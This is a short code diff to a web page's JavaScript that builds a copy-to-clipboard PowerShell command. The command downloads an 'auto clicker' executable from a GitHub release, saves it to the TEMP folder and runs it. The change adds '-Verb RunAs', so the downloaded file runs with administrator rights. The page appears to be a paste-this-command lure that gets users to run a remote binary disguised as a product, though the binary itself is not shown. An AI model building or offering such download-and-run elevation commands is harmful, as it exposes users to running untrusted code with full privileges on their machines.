@@ -335,7 +335,7 @@ document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
   var cmd = [
     'powershell -c "iwr ',
     "'https://github.com/dusk1337sudo/op-auto-clicker/releases/download/1/op.auto.clicker.exe'",
-    ' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe"'
+    ' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe -Verb RunAs"'
   ].join('');
   var btn = document.getElementById('copyBtn');
   btn.addEventListener('click', function() {
